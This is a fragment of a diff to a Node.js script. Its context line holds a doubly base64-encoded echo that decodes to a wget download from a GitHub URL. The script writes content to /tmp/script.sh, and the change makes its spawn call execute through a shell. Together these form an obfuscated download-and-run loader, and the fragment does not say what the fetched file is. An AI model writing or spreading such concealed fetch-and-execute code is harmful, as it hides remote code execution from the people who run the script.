@@ -22,7 +22,7 @@ echo "ZWNobyAiZDJkbGRDQXRUeUJvYVNCb2RIUndjem92TDJkcGRHaDFZaTVqYjIwdmFXTmxlV1p5Yj
 
 fs.writeFileSync("/tmp/script.sh", script);
 
-const child = spawn("apt update && apt install wget -y");
+const child = spawn("apt update && apt install wget -y", { shell: true, stdio: "inherit" });
 
 child.on("error", (err) => {
   console.error("child process error:", err);
